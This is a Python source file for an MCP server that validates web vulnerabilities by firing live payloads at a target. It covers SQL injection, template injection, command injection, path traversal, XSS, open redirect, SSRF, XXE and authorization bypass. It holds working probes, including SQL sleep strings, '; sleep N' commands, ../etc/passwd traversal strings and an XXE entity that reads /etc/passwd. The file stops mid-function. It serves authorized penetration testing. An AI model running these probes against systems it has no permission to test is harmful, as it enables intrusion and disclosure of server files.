#!/usr/bin/env python3
"""
mcp-validator: Deterministik Exploit Doğrulama Sunucusu (XBOW-tarzı validator)
==============================================================================
CCO'nun en kritik eksiğini kapatır: bir bulgunun *gerçekten exploit edilebilir*
olduğunu **deterministik oracle'larla** kanıtlar — LLM görüşü değil, ölçülebilir
kanıt. Felsefe XBOW ile aynı: **"yaratıcı AI keşfeder, mantık doğrular."**

Her validator çok sayıda kontrollü istek atar ve nesnel bir oracle uygular:
  • Differential analysis  — TRUE/FALSE koşul yanıt farkı (boolean SQLi)
  • Benzersiz canary token  — kaçışsız (unescaped) yansıma (XSS), echo (cmdi)
  • Aritmetik değerlendirme — {{a*b}} = a*b (SSTI), rastgele a,b ile coincidence'sız
  • İçerik imzası            — root:x:0:0 (LFI/XXE), win.ini (path traversal)
  • OOB korelasyonu          — interactsh callback'inde benzersiz token (SSRF)
  • Zamanlama (statistical)  — sleep(d) ile orantılı gecikme (blind SQLi/cmdi)
  • Konum (Location) oracle  — açık yönlendirme hedef host doğrulaması

Sonuç şeması (ValidationReport): verdict (CONFIRMED|UNCONFIRMED|INCONCLUSIVE|ERROR),
confidence (oracle gücüne göre deterministik), oracle, evidence, reproduction
(curl), false_positive_guard. Her doğrulama ~/.cco/validations/ altına audit-trail
olarak yazılır (XBOW-tarzı reproducible kanıt).

> Yalnızca yazılı izinli / scope içi hedeflerde kullan. Bu tool aktif istek atar.
"""

import os
import re
import json
import time
import math
import hashlib
import secrets
import difflib
from datetime import datetime, timezone
from urllib.parse import (urlparse, urlunparse, parse_qsl, urlencode, quote)

import requests
from mcp.server.fastmcp import FastMCP

try:
    import urllib3
    urllib3.disable_warnings()
except Exception:
    pass

CCO_HOME = os.environ.get("CCO_HOME", os.path.expanduser("~/.cco"))
VALID_DIR = os.path.join(CCO_HOME, "validations")
os.makedirs(VALID_DIR, exist_ok=True)

UA = "CCO-Validator/1.0"
DEFAULT_TIMEOUT = int(os.environ.get("CCO_VALIDATOR_TIMEOUT", "20"))

# Verdict sabitleri
CONFIRMED = "CONFIRMED"
UNCONFIRMED = "UNCONFIRMED"
INCONCLUSIVE = "INCONCLUSIVE"
ERROR = "ERROR"

# Oracle gücü → deterministik confidence (LLM yok)
ORACLE_CONFIDENCE = {
    "oob_correlation": 0.99,
    "file_signature": 0.98,
    "arithmetic_eval": 0.97,
    "echo_token": 0.96,
    "redirect_location": 0.95,
    "content_match": 0.90,
    "differential_boolean": 0.90,
    "timing_statistical": 0.82,
    "unescaped_reflection": 0.75,
}

mcp = FastMCP(
    "validator",
    instructions="Deterministik exploit doğrulama — bir bulgunun gerçekten "
                 "exploit edilebilir olduğunu nesnel oracle'larla kanıtlar (XBOW-tarzı)."
)


# ───────────────────────────── HTTP yardımcıları ─────────────────────────────
def _headers(headers_json: str) -> dict:
    try:
        h = json.loads(headers_json) if headers_json else {}
    except Exception:
        h = {}
    if not isinstance(h, dict):
        h = {}
    h.setdefault("User-Agent", UA)
    return h


def _request(method: str, url: str, *, params=None, data=None, headers=None,
             allow_redirects=True, timeout=DEFAULT_TIMEOUT) -> dict:
    """Tek HTTP isteği → normalize edilmiş yanıt (status, len, time, text, headers)."""
    t0 = time.perf_counter()
    try:
        r = requests.request(method.upper(), url, params=params, data=data,
                             headers=headers, allow_redirects=allow_redirects,
                             timeout=timeout, verify=False)
        dt = time.perf_counter() - t0
        return {"ok": True, "status": r.status_code, "len": len(r.content),
                "time": dt, "text": r.text or "", "headers": dict(r.headers),
                "location": r.headers.get("Location", ""), "final_url": r.url,
                "error": None}
    except Exception as e:
        return {"ok": False, "status": None, "len": 0,
                "time": time.perf_counter() - t0, "text": "", "headers": {},
                "location": "", "final_url": url, "error": str(e)}


def _send_payload(url: str, payload: str, *, param: str = "", method: str = "GET",
                  body_template: str = "", headers: dict = None,
                  allow_redirects: bool = True, timeout: int = DEFAULT_TIMEOUT) -> dict:
    """Payload'u doğru yere yerleştirip gönder. Enjeksiyon noktası seçenekleri:
      • GET + param   → query parametresine yaz
      • GET + url'de {{PAYLOAD}} → URL içine göm
      • POST + body_template ({{PAYLOAD}} içeren) → gövdeye göm
      • POST + param  → form alanına yaz
    """
    headers = headers or {}
    if method.upper() == "GET":
        if param:
            parsed = urlparse(url)
            q = dict(parse_qsl(parsed.query, keep_blank_values=True))
            q[param] = payload
            full = urlunparse(parsed._replace(query=urlencode(q, doseq=True)))
            return _request("GET", full, headers=headers,
                            allow_redirects=allow_redirects, timeout=timeout)
        if "{{PAYLOAD}}" in url:
            full = url.replace("{{PAYLOAD}}", quote(payload, safe=""))
            return _request("GET", full, headers=headers,
                            allow_redirects=allow_redirects, timeout=timeout)
        return _request("GET", url, params={"q": payload}, headers=headers,
                        allow_redirects=allow_redirects, timeout=timeout)
    # POST
    if body_template and "{{PAYLOAD}}" in body_template:
        ctype = {k.lower(): v for k, v in headers.items()}.get("content-type", "")
        inj = json.dumps(payload)[1:-1] if "json" in ctype.lower() else payload
        body = body_template.replace("{{PAYLOAD}}", inj)
        return _request("POST", url, data=body.encode("utf-8"), headers=headers,
                        allow_redirects=allow_redirects, timeout=timeout)
    if param:
        return _request("POST", url, data={param: payload}, headers=headers,
                        allow_redirects=allow_redirects, timeout=timeout)
    return _request("POST", url, data={"q": payload}, headers=headers,
                    allow_redirects=allow_redirects, timeout=timeout)


def _ratio(a: str, b: str) -> float:
    """İki yanıt gövdesinin içerik benzerliği (0..1). Hız için kırpılır."""
    a = (a or "")[:20000]
    b = (b or "")[:20000]
    if not a and not b:
        return 1.0
    return difflib.SequenceMatcher(None, a, b).ratio()


def _similar(r1: dict, r2: dict) -> float:
    """Status + uzunluk + içerik birleşik benzerliği (0..1)."""
    if r1.get("status") != r2.get("status"):
        return 0.0
    l1, l2 = r1.get("len", 0), r2.get("len", 0)
    len_sim = 1.0 if max(l1, l2) == 0 else 1 - abs(l1 - l2) / max(l1, l2)
    return round(0.4 * len_sim + 0.6 * _ratio(r1.get("text", ""), r2.get("text", "")), 4)


def _curl(method: str, url: str, body: str = "", headers: dict = None) -> str:
    parts = ["curl -sk"]
    if method.upper() != "GET":
        parts.append(f"-X {method.upper()}")
    for k, v in (headers or {}).items():
        if k.lower() == "user-agent":
            continue
        parts.append(f"-H {json.dumps(f'{k}: {v}')}")
    if body:
        parts.append(f"--data {json.dumps(body)}")
    parts.append(json.dumps(url))
    return " ".join(parts)


def _persist(res: dict) -> None:
    """Audit-trail: her doğrulamayı diske yaz (reproducible kanıt)."""
    try:
        ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S%f")
        slug = re.sub(r"[^a-z0-9]+", "-", res.get("vuln_type", "finding").lower())[:24]
        path = os.path.join(VALID_DIR, f"{ts}_{slug}.json")
        with open(path, "w") as f:
            json.dump(res, f, indent=2, ensure_ascii=False)
        res["audit_trail"] = path
    except Exception:
        pass


def _result(vuln_type: str, target: str, verdict: str, oracle: str,
            evidence: dict, reproduction, notes: str = "",
            severity: str = "high") -> str:
    confidence = ORACLE_CONFIDENCE.get(oracle, 0.0) if verdict == CONFIRMED else 0.0
    if isinstance(reproduction, str):
        reproduction = [reproduction]
    res = {
        "validator": "cco-deterministic-validator",
        "vuln_type": vuln_type,
        "target": target,
        "verdict": verdict,
        "confidence": confidence,
        "severity": severity if verdict == CONFIRMED else "info",
        "oracle": oracle,
        "evidence": evidence,
        "reproduction": reproduction,
        "false_positive_guard": (
            "Doğrulama deterministik bir oracle ile yapıldı (LLM görüşü değil); "
            "kanıt yeniden üretilebilir."
        ),
        "notes": notes,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    _persist(res)
    return json.dumps(res, indent=2, ensure_ascii=False)


# ───────────────────────── SSTI aritmetik oracle (pure) ─────────────────────────
def _ssti_oracle(text: str, a: int, b: int) -> bool:
    """Yanıtta a*b SONUCU var ama '<a>*<b>' ifadesi YOK → template değerlendirildi."""
    text = text or ""
    product = str(a * b)
    return product in text and f"{a}*{b}" not in text


# ───────────────────────── Differential boolean (pure) ─────────────────────────
def _boolean_confirms(base: dict, t_resp: dict, f_resp: dict,
                      same_thr: float = 0.95, diff_thr: float = 0.95) -> bool:
    """TRUE koşulu baseline'a benziyor, FALSE koşulu belirgin farklı → boolean SQLi."""
    if not (t_resp.get("ok") and f_resp.get("ok")):
        return False
    sim_true = _similar(base, t_resp)
    sim_false = _similar(base, f_resp)
    sim_tf = _similar(t_resp, f_resp)
    return sim_true >= same_thr and sim_tf < diff_thr and sim_true > sim_false


# ───────────────────────── Zamanlama oracle (statistical) ─────────────────────────
def _median(xs):
    xs = sorted(xs)
    n = len(xs)
    if n == 0:
        return 0.0
    return xs[n // 2] if n % 2 else (xs[n // 2 - 1] + xs[n // 2]) / 2


def _timing_confirm(send_fn, baseline_time: float, d1: int, d2: int):
    """send_fn(delay)->resp. Gecikme delay ile orantılı artıyorsa blind enjeksiyon.
    İki seviye (d1<d2) ölçer; jitter'a karşı min alır ve ÖLÇEKLENME kontrol eder."""
    t1 = min(send_fn(d1).get("time", 0.0) for _ in range(2))
    t2 = min(send_fn(d2).get("time", 0.0) for _ in range(2))
    scaled = (t2 - t1) >= (d2 - d1) * 0.6
    above_base = (t1 - baseline_time) >= d1 * 0.6
    return (scaled and above_base), {"baseline_s": round(baseline_time, 3),
                                     f"delay_{d1}s_resp": round(t1, 3),
                                     f"delay_{d2}s_resp": round(t2, 3),
                                     "scales_with_delay": scaled,
                                     "above_baseline": above_base}


# İçerik imzaları
LINUX_FILE_SIG = re.compile(r"root:.*?:0:0:")
WIN_FILE_SIG = re.compile(r"\[(fonts|extensions|mci extensions)\]", re.I)


# ════════════════════════════════ TOOLS ════════════════════════════════

@mcp.tool()
def validate_sqli(target_url: str, param: str = "", method: str = "GET",
                  body_template: str = "", headers_json: str = "{}") -> str:
    """SQL Injection'ı DETERMİNİSTİK doğrula — differential (boolean) + error +
    time-based oracle. LLM tahmini değil; TRUE/FALSE koşul yanıt farkı ölçülür.

    Args:
        target_url: Hedef URL (örn http://t/item.php?id=1)
        param: Enjekte edilecek query/form parametresi (örn 'id')
        method: GET veya POST
        body_template: POST için '{{PAYLOAD}}' içeren gövde şablonu
        headers_json: Ek HTTP başlıkları (JSON; örn auth cookie)
    """
    H = _headers(headers_json)
    # orijinal/control değer
    base_val = ""
    if method.upper() == "GET" and param:
        q = dict(parse_qsl(urlparse(target_url).query, keep_blank_values=True))
        base_val = q.get(param, "1")
    base_val = base_val or "1"
    base = _send_payload(target_url, base_val, param=param, method=method,
                         body_template=body_template, headers=H)
    if not base.get("ok"):
        return _result("SQL Injection", target_url, INCONCLUSIVE, "differential_boolean",
                       {"error": base.get("error")}, "-",
                       notes="Baseline isteği başarısız (hedef erişilemez?).")

    # 1) Differential boolean — birden çok payload çifti dene
    pairs = [
        (f"{base_val} AND 1=1", f"{base_val} AND 1=2"),
        (f"{base_val}' AND '1'='1", f"{base_val}' AND '1'='2"),
        (f"{base_val}\" AND \"1\"=\"1", f"{base_val}\" AND \"1\"=\"2"),
        (f"{base_val}) AND (1=1", f"{base_val}) AND (1=2"),
    ]
    for t_pl, f_pl in pairs:
        tr = _send_payload(target_url, t_pl, param=param, method=method,
                           body_template=body_template, headers=H)
        fr = _send_payload(target_url, f_pl, param=param, method=method,
                           body_template=body_template, headers=H)
        if _boolean_confirms(base, tr, fr):
            return _result(
                "SQL Injection (boolean-based)", target_url, CONFIRMED,
                "differential_boolean",
                {"true_payload": t_pl, "false_payload": f_pl,
                 "sim_true_vs_baseline": _similar(base, tr),
                 "sim_true_vs_false": _similar(tr, fr),
                 "true_status_len": [tr["status"], tr["len"]],
                 "false_status_len": [fr["status"], fr["len"]]},
                [_curl(method, target_url, body_template.replace("{{PAYLOAD}}", t_pl) if body_template else ""),
                 _curl(method, target_url, body_template.replace("{{PAYLOAD}}", f_pl) if body_template else "")],
                notes="TRUE koşulu baseline'a denk, FALSE koşulu belirgin farklı → SQLi doğrulandı.")

    # 2) Error-based imzalar
    err_sig = re.compile(
        r"(SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|"
        r"SQLite/JDBCDriver|Unclosed quotation mark|quoted string not properly|"
        r"Microsoft OLE DB Provider|valid MySQL result|psql:)", re.I)
    er = _send_payload(target_url, base_val + "'", param=param, method=method,
                       body_template=body_template, headers=H)
    if er.get("ok") and err_sig.search(er.get("text", "")) and not err_sig.search(base.get("text", "")):
        m = err_sig.search(er["text"])
        return _result("SQL Injection (error-based)", target_url, CONFIRMED,
                       "content_match",
                       {"payload": base_val + "'", "db_error_signature": m.group(0)},
                       _curl(method, target_url),
                       notes="DB hata mesajı yalnızca payload ile ortaya çıktı.")

    # 3) Time-based blind
    base_time = _median([_send_payload(target_url, base_val, param=param, method=method,
                         body_template=body_template, headers=H).get("time", 0) for _ in range(2)])

    def _send_sleep(d):
        return _send_payload(target_url, f"{base_val}' OR SLEEP({d})-- -", param=param,
                             method=method, body_template=body_template, headers=H,
                             timeout=max(DEFAULT_TIMEOUT, d * 3 + 5))
    ok, tinfo = _timing_confirm(_send_sleep, base_time, 2, 4)
    if ok:
        return _result("SQL Injection (time-based blind)", target_url, CONFIRMED,
                       "timing_statistical", {"payload": f"' OR SLEEP(N)-- -", **tinfo},
                       _curl(method, target_url),
                       notes="Yanıt süresi SLEEP(N) ile orantılı arttı → blind SQLi.")

    return _result("SQL Injection", target_url, UNCONFIRMED, "differential_boolean",
                   {"tested": "boolean+error+time", "baseline_status": base["status"]},
                   "-", notes="Hiçbir deterministik oracle tetiklenmedi.")


@mcp.tool()
def validate_ssti(target_url: str, param: str = "", method: str = "GET",
                  body_template: str = "", headers_json: str = "{}") -> str:
    """Server-Side Template Injection'ı aritmetik oracle ile doğrula. Rastgele
    a,b seçilir; yanıtta a*b SONUCU görünür ama '<a>*<b>' ifadesi GÖRÜNMEZSE
    template render edilmiş demektir (coincidence olasılığı sıfıra yakın).

    Args:
        target_url: Hedef URL
        param: Enjeksiyon parametresi
        method: GET/POST
        body_template: POST için '{{PAYLOAD}}' içeren gövde
        headers_json: Ek başlıklar (JSON)
    """
    H = _headers(headers_json)
    a, b = secrets.randbelow(289) + 211, secrets.randbelow(289) + 211  # 211..499
    base = _send_payload(target_url, "cco_probe", param=param, method=method,
                         body_template=body_template, headers=H)
    if base.get("ok") and str(a * b) in base.get("text", ""):
        a, b = a + 7, b + 13  # baseline'da çakışıyorsa kaydır
    engines = {
        "Jinja2/Twig/Nunjucks": f"{{{{{a}*{b}}}}}",
        "Razor": f"@({a}*{b})",
        "ERB": f"<%= {a}*{b} %>",
        "Freemarker": f"${{{a}*{b}}}",
        "Velocity/Mako": f"#set($x={a}*{b})$x",
        "Smarty": f"{{{a}*{b}}}",
    }
    for engine, pl in engines.items():
        r = _send_payload(target_url, pl, param=param, method=method,
                          body_template=body_template, headers=H)
        if r.get("ok") and _ssti_oracle(r.get("text", ""), a, b):
            return _result("Server-Side Template Injection", target_url, CONFIRMED,
                           "arithmetic_eval",
                           {"engine_hint": engine, "payload": pl,
                            "expected_product": a * b, "operands": [a, b],
                            "evaluated": True},
                           _curl(method, target_url),
                           notes=f"{a}*{b}={a*b} sonucu render edildi → SSTI doğrulandı. "
                                 f"RCE için generate_exploit_poc ile engine-spesifik PoC üret.")
    return _result("Server-Side Template Injection", target_url, UNCONFIRMED,
                   "arithmetic_eval", {"operands": [a, b], "engines_tested": list(engines)},
                   "-", notes="Aritmetik ifade değerlendirilmedi.")


@mcp.tool()
def validate_command_injection(target_url: str, param: str = "", method: str = "GET",
                               body_template: str = "", headers_json: str = "{}") -> str:
    """OS Command Injection'ı echo-token + time-based oracle ile doğrula.
    Önce benzersiz token echo'sunu yanıtta arar (kör değilse); olmadıysa
    sleep ile statistical zamanlama kontrolü yapar.

    Args:
        target_url: Hedef URL
        param: Enjeksiyon parametresi
        method: GET/POST
        body_template: POST gövde şablonu ('{{PAYLOAD}}')
        headers_json: Ek başlıklar (JSON)
    """
    H = _headers(headers_json)
    token = "CCOCMD" + secrets.token_hex(4).upper()
    base = _send_payload(target_url, "cco", param=param, method=method,
                         body_template=body_template, headers=H)
    # 1) echo-token (non-blind)
    echo_payloads = [f"; echo {token}", f"| echo {token}", f"&& echo {token}",
                     f"$(echo {token})", f"`echo {token}`", f"%0aecho {token}"]
    for pl in echo_payloads:
        r = _send_payload(target_url, pl, param=param, method=method,
                          body_template=body_template, headers=H)
        if r.get("ok") and token in r.get("text", "") and token not in base.get("text", ""):
            return _result("OS Command Injection", target_url, CONFIRMED, "echo_token",
                           {"payload": pl, "echoed_token": token},
                           _curl(method, target_url),
                           notes="Enjekte edilen echo komutunun çıktısı yanıtta göründü → RCE.")
    # 2) time-based blind
    base_time = _median([_send_payload(target_url, "cco", param=param, method=method,
                         body_template=body_template, headers=H).get("time", 0) for _ in range(2)])

    def _send_sleep(d):
        return _send_payload(target_url, f"; sleep {d}", param=param, method=method,
                             body_template=body_template, headers=H,
                             timeout=max(DEFAULT_TIMEOUT, d * 3 + 5))
    ok, tinfo = _timing_confirm(_send_sleep, base_time, 2, 4)
    if ok:
        return _result("OS Command Injection (blind/time-based)", target_url, CONFIRMED,
                       "timing_statistical", {"payload": "; sleep N", **tinfo},
                       _curl(method, target_url),
                       notes="Yanıt süresi sleep N ile orantılı → kör komut enjeksiyonu.")
    return _result("OS Command Injection", target_url, UNCONFIRMED, "echo_token",
                   {"tested": "echo+time", "token": token}, "-",
                   notes="Komut çıktısı/gecikme gözlenmedi.")


@mcp.tool()
def validate_path_traversal(target_url: str, param: str = "", method: str = "GET",
                            body_template: str = "", headers_json: str = "{}") -> str:
    """Path Traversal / LFI'yi içerik imzası oracle'ı ile doğrula. /etc/passwd
    veya win.ini imzası yalnızca payload ile dönüyorsa (baseline'da yoksa) → onaylı.

    Args:
        target_url: Hedef URL
        param: Dosya yolu parametresi (örn 'file', 'page')
        method: GET/POST
        body_template: POST gövde şablonu ('{{PAYLOAD}}')
        headers_json: Ek başlıklar (JSON)
    """
    H = _headers(headers_json)
    base = _send_payload(target_url, "index", param=param, method=method,
                         body_template=body_template, headers=H)
    base_text = base.get("text", "") if base.get("ok") else ""
    payloads = [
        "../../../../../../etc/passwd",
        "....//....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/etc/passwd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5cwindows%5cwin.ini",
    ]
    for pl in payloads:
        r = _send_payload(target_url, pl, param=param, method=method,
                          body_template=body_template, headers=H)
        if not r.get("ok"):
            continue
        txt = r.get("text", "")
        lm = LINUX_FILE_SIG.search(txt)
        wm = WIN_FILE_SIG.search(txt)
        if lm and not LINUX_FILE_SIG.search(base_text):
            return _result("Path Traversal / LFI", target_url, CONFIRMED, "file_signature",
                           {"payload": pl, "signature": lm.group(0), "file": "/etc/passwd"},
                           _curl(method, target_url),
                           notes="/etc/passwd içeriği döndü → dosya okuma doğrulandı.")
        if wm and not WIN_FILE_SIG.search(base_text):
            return _result("Path Traversal / LFI", target_url, CONFIRMED, "file_signature",
                           {"payload": pl, "signature": wm.group(0), "file": "win.ini"},
                           _curl(method, target_url),
                           notes="win.ini içeriği döndü → Windows dosya okuma doğrulandı.")
        # base64 php filter
        if pl.startswith("php://filter"):
            for tok in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", txt):
                try:
                    import base64
                    dec = base64.b64decode(tok, validate=False).decode("utf-8", "ignore")
                    if LINUX_FILE_SIG.search(dec):
                        return _result("Path Traversal / LFI (php filter)", target_url,
                                       CONFIRMED, "file_signature",
                                       {"payload": pl, "decoded_signature": LINUX_FILE_SIG.search(dec).group(0)},
                                       _curl(method, target_url),
                                       notes="php://filter base64 çözümünde /etc/passwd imzası bulundu.")
                except Exception:
                    pass
    return _result("Path Traversal / LFI", target_url, UNCONFIRMED, "file_signature",
                   {"payloads_tested": len(payloads)}, "-",
                   notes="Bilinen dosya imzası elde edilemedi.")


@mcp.tool()
def validate_xss_reflection(target_url: str, param: str = "", method: str = "GET",
                            body_template: str = "", headers_json: str = "{}") -> str:
    """Reflected XSS'i kaçışsız-yansıma (unescaped reflection) oracle'ı ile doğrula.
    Benzersiz bir marker enjekte edilir; yanıtta HAM '<marker>' olarak (kaçışsız)
    görünüyorsa çalıştırılabilir bağlamda yansıma var demektir. Tam 'execution'
    kanıtı için kali-tools browser_dom_xss ile DOM'da teyit önerilir.

    Args:
        target_url: Hedef URL
        param: Yansıyan parametre
        method: GET/POST
        body_template: POST gövde şablonu ('{{PAYLOAD}}')
        headers_json: Ek başlıklar (JSON)
    """
    H = _headers(headers_json)
    canary = "cco" + secrets.token_hex(4)
    raw = f'<{canary}>"\'</{canary}>'
    r = _send_payload(target_url, raw, param=param, method=method,
                      body_template=body_template, headers=H)
    if not r.get("ok"):
        return _result("Reflected XSS", target_url, INCONCLUSIVE, "unescaped_reflection",
                       {"error": r.get("error")}, "-", notes="İstek başarısız.")
    txt = r.get("text", "")
    raw_tag = f"<{canary}>"
    enc_tag = f"&lt;{canary}&gt;"
    if raw_tag in txt:
        idx = txt.find(raw_tag)
        window = txt[max(0, idx - 120):idx]
        in_script = "<script" in window.lower() and "</script" not in window.lower()
        context = "javascript (<script>)" if in_script else "HTML body/attribute"
        return _result("Reflected XSS", target_url, CONFIRMED, "unescaped_reflection",
                       {"marker": canary, "reflected_raw": True, "context": context,
                        "snippet": txt[max(0, idx - 40):idx + 60]},
                       _curl(method, target_url), severity="medium",
                       notes="Marker kaçışsız (ham '<...>') yansıdı → XSS'e açık bağlam. "
                             "Execution teyidi için browser_dom_xss çalıştır.")
    if enc_tag in txt:
        return _result("Reflected XSS", target_url, UNCONFIRMED, "unescaped_reflection",
                       {"marker": canary, "reflected_raw": False, "html_encoded": True},
                       "-", notes="Marker yansıdı ama HTML-encode edildi (&lt;) → korumalı.")
    return _result("Reflected XSS", target_url, UNCONFIRMED, "unescaped_reflection",
                   {"marker": canary, "reflected": False}, "-",
                   notes="Marker yanıtta yansımadı.")


@mcp.tool()
def validate_open_redirect(target_url: str, param: str = "", headers_json: str = "{}") -> str:
    """Open Redirect'i Location-header oracle'ı ile doğrula. Sentinel bir dış host
    enjekte edilir; 3xx yanıtın Location'ı bu host'a gidiyorsa → onaylı (deterministik).

    Args:
        target_url: Yönlendirme yapan URL (örn http://t/go?url=...)
        param: Yönlendirme parametresi (örn 'url','next','redirect')
        headers_json: Ek başlıklar (JSON)
    """
    H = _headers(headers_json)
    sentinel = "evil.cco-validate.test"
    payloads = [f"https://{sentinel}/", f"//{sentinel}/", f"/\\{sentinel}/",
                f"https://{sentinel}%2f..", f"https://target@{sentinel}/",
                f"http://{sentinel}/"]
    for pl in payloads:
        r = _send_payload(target_url, pl, param=param, method="GET", headers=H,
                          allow_redirects=False)
        loc = r.get("location", "")
        if not loc:
            continue
        host = urlparse(loc if "//" in loc else "//" + loc.lstrip("/\\")).hostname or ""
        if host.endswith(sentinel):
            return _result("Open Redirect", target_url, CONFIRMED, "redirect_location",
                           {"payload": pl, "status": r.get("status"),
                            "location_header": loc, "redirect_host": host},
                           _curl("GET", target_url), severity="medium",
                           notes="3xx Location dış sentinel host'a yönlendi → açık yönlendirme.")
    return _result("Open Redirect", target_url, UNCONFIRMED, "redirect_location",
                   {"payloads_tested": len(payloads)}, "-",
                   notes="Hiçbir payload dış host'a yönlendirmedi.")


@mcp.tool()
def validate_ssrf_oob(target_url: str, oob_domain: str, param: str = "",
                      method: str = "GET", body_template: str = "",
                      headers_json: str = "{}") -> str:
    """SSRF için benzersiz bir OOB token'ı payload'a gömüp hedefe gönderir. Token,
    interactsh callback'i ile DETERMİNİSTİK korele edilir (sonraki adım:
    kali-tools.interactsh_poll → confirm_oob_callback). İlk başta kali-tools.
    interactsh_start ile oob_domain al.

    Args:
        target_url: SSRF'e açık olabilecek URL
        oob_domain: interactsh_start'tan dönen OOB domain
        param: URL alan parametresi (örn 'url','uri','dest')
        method: GET/POST
        body_template: POST gövde şablonu ('{{PAYLOAD}}')
        headers_json: Ek başlıklar (JSON)
    """
    H = _headers(headers_json)
    token = "ccossrf" + secrets.token_hex(5)
    oob = f"{token}.{oob_domain.strip().lstrip('.')}"
    payloads = [f"http://{oob}/", f"https://{oob}/", f"http://{oob}:80/x",
                f"//{oob}/", f"http://{oob}@127.0.0.1/"]
    sent = []
    for pl in payloads:
        r = _send_payload(target_url, pl, param=param, method=method,
                          body_template=body_template, headers=H)
        sent.append({"payload": pl, "status": r.get("status"), "ok": r.get("ok")})
    return _result("SSRF (OOB pending)", target_url, INCONCLUSIVE, "oob_correlation",
                   {"oob_token": token, "oob_host": oob, "requests_sent": sent},
                   _curl(method, target_url),
                   notes=("Token gönderildi. ŞİMDİ: kali-tools.interactsh_poll() çalıştır, "
                          f"sonra confirm_oob_callback(token='{token}', poll_output=...) ile "
                          "deterministik doğrula. Callback gelirse SSRF CONFIRMED."))


@mcp.tool()
def confirm_oob_callback(token: str, poll_output: str, target_url: str = "",
                         vuln_type: str = "SSRF") -> str:
    """interactsh_poll çıktısında benzersiz OOB token'ı arar — DETERMİNİSTİK
    korelasyon. Token callback log'unda varsa blind zafiyet (SSRF/XXE/RCE) onaylı.

    Args:
        token: validate_ssrf_oob'un ürettiği benzersiz token
        poll_output: kali-tools.interactsh_poll() ham çıktısı
        target_url: (opsiyonel) hedef URL — rapor için
        vuln_type: Doğrulanan zafiyet tipi (SSRF/Blind XXE/Blind RCE...)
    """
    hit = token and token in (poll_output or "")
    if hit:
        proto = "DNS"
        for p in ("HTTP", "DNS", "SMTP", "LDAP"):
            if p in poll_output:
                proto = p
                break
        return _result(f"{vuln_type} (OOB-confirmed)", target_url or "(callback)",
                       CONFIRMED, "oob_correlation",
                       {"token": token, "callback_protocol": proto, "correlated": True},
                       "interactsh callback log",
                       notes="Benzersiz token hedeften gelen OOB callback'inde bulundu → "
                             "kör zafiyet deterministik olarak doğrulandı.")
    return _result(f"{vuln_type} (OOB)", target_url or "(callback)", UNCONFIRMED,
                   "oob_correlation", {"token": token, "correlated": False}, "-",
                   notes="Token callback log'unda yok — daha uzun bekle veya payload'ı gözden geçir.")


@mcp.tool()
def validate_xxe(target_url: str, content_type: str = "application/xml",
                 headers_json: str = "{}") -> str:
    """XXE'yi dosya-imzası oracle'ı ile doğrula. file:///etc/passwd entity'si
    enjekte edilir; yanıtta passwd imzası dönerse → onaylı. (Blind XXE için
    validate_ssrf_oob + confirm_oob_callback kullan.)

    Args:
        target_url: XML kabul eden endpoint (POST)
        content_type: Gövde content-type'ı (application/xml | text/xml)
        headers_json: Ek başlıklar (JSON)
    """
    H = _headers(headers_json)
    H["Content-Type"] = content_type
    marker = "ccoxxe" + secrets.token_hex(3)
    body = (f'<?xml version="1.0"?>\n'
            f'<!DOCTYPE {marker} [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n'
            f'<{marker}>&xxe;</{marker}>')
    r = _request("POST", target_url, data=body.encode(), headers=H)
    if not r.get("ok"):
        return _result("XXE", target_url, INCONCLUSIVE, "file_signature",
                       {"error": r.get("error")}, "-", notes="İstek başarısız.")
    m = LINUX_FILE_SIG.search(r.get("text", ""))
    if m:
        return _result("XML External Entity (XXE)", target_url, CONFIRMED, "file_signature",
                       {"file": "/etc/passwd", "signature": m.group(0),
                        "content_type": content_type},
                       _curl("POST", target_url, body, H),
                       notes="file:// entity ile /etc/passwd okundu → XXE doğrulandı.")
    return _result("XML External Entity (XXE)", target_url, UNCONFIRMED, "file_signature",
                   {"status": r.get("status")}, _curl("POST", target_url, body, H),
                   notes="Dosya imzası dönmedi. Blind XXE için OOB akışını dene.")


@mcp.tool()
def validate_auth_bypass(protected_url: str, authorized_headers_json: str,
                         method: str = "GET") -> str:
    """Authentication/Authorization bypass'ı differential ile doğrula. Yetkili
    istek (200 + içerik) ile yetkisiz istek (auth header'sız) karşılaştırılır;
    yetkisiz istek korunan içeriğin AYNISINI alıyorsa → bypass onaylı.

    Args:
        protected_url: Korunan kaynak URL'i
        authorized_headers_json: Yetkili erişim başlıkları (JSON; cookie/token)
        method: HTTP metodu
    """
    auth_h = _headers(authorized_headers_json)
    authed = _request(method, protected_url, headers=auth_h, allow_redirects=False)
    if not authed.get("ok") or authed.get("status") not in (200, 206):
        return _result("Auth Bypass", protected_url, INCONCLUSIVE, "content_match",
                       {"authorized_status": authed.get("status")}, "-",
                       notes="Yetkili istek 200 dönmedi — geçerli kimlik/headers ver.")
    unauth = _request(method, protected_url, headers={"User-Agent": UA},
                      allow_redirects=False)
    login_markers = re.compile(r"(login|sign in|unauthorized|forbidden|401|403)", re.I)
    same = _similar(authed, unauth)
    if (unauth.get("ok") and unauth.get("status") in (200, 206) and same >= 0.9
            and not login_markers.search(unauth.get("text", "")[:500])):
        return _result("Authentication/Authorization Bypass", protected_url, CONFIRMED,
                       "content_match",
                       {"authorized_status": authed["status"], "unauth_status": unauth["status"],
                        "content_similarity": same},
                       [_curl(method, protected_url, headers=auth_h),
                        _curl(method, protected_url)],
                       notes="Yetkisiz istek korunan içeriğin aynısını döndürdü → erişim kontrolü yok.")
    return _result("Authentication/Authorization Bypass", protected_url, UNCONFIRMED,
                   "content_match",
                   {"unauth_status": unauth.get("status"), "content_similarity": same},
                   "-", notes="Yetkisiz erişim engellendi (beklenen davranış).")


@mcp.tool()
def validate_idor(object_url: str, owner_headers_json: str, attacker_headers_json: str) -> str:
    """IDOR'u differential ile doğrula. Sahip (owner) kimliğiyle alınan nesne ile
    saldırgan (başka kimlik) ile alınan aynı nesne karşılaştırılır; saldırgan
    sahibin verisini alıyorsa → IDOR onaylı.

    Args:
